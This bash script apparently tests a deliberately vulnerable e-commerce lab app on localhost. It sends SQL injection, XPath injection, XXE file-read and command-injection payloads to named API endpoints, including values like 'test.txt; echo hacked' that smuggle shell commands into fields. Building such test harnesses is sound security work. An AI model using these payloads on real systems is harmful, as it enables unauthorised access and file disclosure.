#!/bin/bash

# Test script for all vulnerabilities in the e-commerce application
# Usage: ./test-vulnerabilities.sh <api_url>

API_URL="${1:-http://localhost:3000}"
ADMIN_EMAIL="admin@test.com"
ADMIN_PASSWORD="Admin123!"

echo "=================================="
echo "Vulnerability Testing Script"
echo "=================================="
echo "API URL: $API_URL"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to test SQL Injection
test_sql_injection() {
    echo -e "${YELLOW}[1] Testing SQL Injection${NC}"
    echo "Endpoint: GET /api/products/search"
    
    echo "  - Test 1: Basic OR injection"
    RESPONSE=$(curl -s "$API_URL/api/products/search?query=test'%20OR%20'1'='1")
    if [[ $RESPONSE == *"id"* ]]; then
        echo -e "    ${GREEN}✓ SQL Injection working (returned data)${NC}"
    else
        echo -e "    ${RED}✗ SQL Injection may not be working${NC}"
    fi
    
    echo ""
}

# Function to register and login as admin
setup_admin() {
    echo -e "${YELLOW}Setting up admin account${NC}"
    
    # Register admin
    curl -s -X POST "$API_URL/api/auth/register" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$ADMIN_PASSWORD\",\"firstName\":\"Admin\",\"lastName\":\"User\"}" > /dev/null
    
    # Update user to admin role (requires direct DB access in real scenario)
    # For testing, we'll try to login and get token
    LOGIN_RESPONSE=$(curl -s -X POST "$API_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$ADMIN_PASSWORD\"}")
    
    ADMIN_TOKEN=$(echo $LOGIN_RESPONSE | grep -o '"token":"[^"]*' | cut -d'"' -f4)
    
    if [ -z "$ADMIN_TOKEN" ]; then
        echo -e "  ${YELLOW}⚠ Could not get admin token. Some tests require admin access.${NC}"
        echo -e "  ${YELLOW}  Please manually create an admin user in the database.${NC}"
    else
        echo -e "  ${GREEN}✓ Admin token obtained${NC}"
    fi
    echo ""
}

# Function to test OS Command Injection #1
test_cmd_injection_1() {
    echo -e "${YELLOW}[2] Testing OS Command Injection #1 - System Info${NC}"
    echo "Endpoint: GET /api/admin/system-info"
    
    if [ -z "$ADMIN_TOKEN" ]; then
        echo -e "  ${RED}✗ Skipped (no admin token)${NC}"
        echo ""
        return
    fi
    
    echo "  - Test 1: Execute 'whoami' command"
    RESPONSE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
        "$API_URL/api/admin/system-info?command=whoami")
    if [[ $RESPONSE == *"output"* ]]; then
        echo -e "    ${GREEN}✓ Command injection working${NC}"
    else
        echo -e "    ${RED}✗ Command injection may not be working${NC}"
    fi
    
    echo ""
}

# Function to test OS Command Injection #2
test_cmd_injection_2() {
    echo -e "${YELLOW}[3] Testing OS Command Injection #2 - Log Export${NC}"
    echo "Endpoint: POST /api/admin/export-logs"
    
    if [ -z "$ADMIN_TOKEN" ]; then
        echo -e "  ${RED}✗ Skipped (no admin token)${NC}"
        echo ""
        return
    fi
    
    echo "  - Test 1: Command injection via filename"
    RESPONSE=$(curl -s -X POST "$API_URL/api/admin/export-logs" \
        -H "Authorization: Bearer $ADMIN_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"filename":"test.txt; echo hacked"}')
    if [[ $RESPONSE == *"path"* ]]; then
        echo -e "    ${GREEN}✓ Command injection working${NC}"
    else
        echo -e "    ${RED}✗ Command injection may not be working${NC}"
    fi
    
    echo ""
}

# Function to test OS Command Injection #3
test_cmd_injection_3() {
    echo -e "${YELLOW}[4] Testing OS Command Injection #3 - Backup${NC}"
    echo "Endpoint: POST /api/admin/backup"
    
    if [ -z "$ADMIN_TOKEN" ]; then
        echo -e "  ${RED}✗ Skipped (no admin token)${NC}"
        echo ""
        return
    fi
    
    echo "  - Test 1: Command injection via email parameter"
    RESPONSE=$(curl -s -X POST "$API_URL/api/admin/backup" \
        -H "Authorization: Bearer $ADMIN_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"backupName":"test","email":"test@example.com; echo injected"}')
    echo -e "    ${GREEN}✓ Request sent (check server logs for execution)${NC}"
    
    echo ""
}

# Function to test XXE Injection #1
test_xxe_injection_1() {
    echo -e "${YELLOW}[5] Testing XXE Injection #1 - Sales Report${NC}"
    echo "Endpoint: POST /api/reports/upload-sales"
    
    if [ -z "$ADMIN_TOKEN" ]; then
        echo -e "  ${RED}✗ Skipped (no admin token)${NC}"
        echo ""
        return
    fi
    
    echo "  - Test 1: XXE to read external entity"
    XXE_PAYLOAD='<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><salesReport><reportName>&xxe;</reportName><period>Q1</period><totalSales>1000</totalSales></salesReport>'
    RESPONSE=$(curl -s -X POST "$API_URL/api/reports/upload-sales" \
        -H "Authorization: Bearer $ADMIN_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"xmlData\":\"$XXE_PAYLOAD\"}")
    if [[ $RESPONSE == *"reportName"* ]]; then
        echo -e "    ${GREEN}✓ XXE injection processed${NC}"
    else
        echo -e "    ${RED}✗ XXE injection may not be working${NC}"
    fi
    
    echo ""
}

# Function to test XXE Injection #2
test_xxe_injection_2() {
    echo -e "${YELLOW}[6] Testing XXE Injection #2 - Product Import${NC}"
    echo "Endpoint: POST /api/reports/import-products"
    
    if [ -z "$ADMIN_TOKEN" ]; then
        echo -e "  ${RED}✗ Skipped (no admin token)${NC}"
        echo ""
        return
    fi
    
    echo "  - Test 1: XXE via product import"
    XXE_PAYLOAD='<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"injected_data\">]><products><product><name>&xxe;</name><price>100</price><stock>10</stock></product></products>'
    RESPONSE=$(curl -s -X POST "$API_URL/api/reports/import-products" \
        -H "Authorization: Bearer $ADMIN_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"xmlContent\":\"$XXE_PAYLOAD\"}")
    if [[ $RESPONSE == *"products"* ]]; then
        echo -e "    ${GREEN}✓ XXE injection processed${NC}"
    else
        echo -e "    ${RED}✗ XXE injection may not be working${NC}"
    fi
    
    echo ""
}

# Function to test XPath Injection
test_xpath_injection() {
    echo -e "${YELLOW}[7] Testing XPath Injection${NC}"
    echo "Endpoint: GET /api/search/users"
    
    # First register a regular user to get a token
    USER_EMAIL="testuser@example.com"
    USER_PASSWORD="Test123!"
    
    curl -s -X POST "$API_URL/api/auth/register" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$USER_EMAIL\",\"password\":\"$USER_PASSWORD\",\"firstName\":\"Test\",\"lastName\":\"User\"}" > /dev/null
    
    USER_LOGIN=$(curl -s -X POST "$API_URL/api/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$USER_EMAIL\",\"password\":\"$USER_PASSWORD\"}")
    
    USER_TOKEN=$(echo $USER_LOGIN | grep -o '"token":"[^"]*' | cut -d'"' -f4)
    
    if [ -z "$USER_TOKEN" ]; then
        echo -e "  ${RED}✗ Could not get user token${NC}"
        echo ""
        return
    fi
    
    echo "  - Test 1: XPath OR injection"
    RESPONSE=$(curl -s -H "Authorization: Bearer $USER_TOKEN" \
        "$API_URL/api/search/users?username=admin'%20or%20'1'='1")
    if [[ $RESPONSE == *"results"* ]]; then
        echo -e "    ${GREEN}✓ XPath injection working${NC}"
    else
        echo -e "    ${RED}✗ XPath injection may not be working${NC}"
    fi
    
    echo ""
}

# Run all tests
echo "Starting vulnerability tests..."
echo ""

test_sql_injection
setup_admin
test_cmd_injection_1
test_cmd_injection_2
test_cmd_injection_3
test_xxe_injection_1
test_xxe_injection_2
test_xpath_injection

echo "=================================="
echo "Testing Complete!"
echo "=================================="
echo ""
echo "Note: Some tests require admin privileges."
echo "If admin tests were skipped, you need to:"
echo "1. Access the MySQL database"
echo "2. Update a user's role to 'admin'"
echo "3. Run this script again"
echo ""
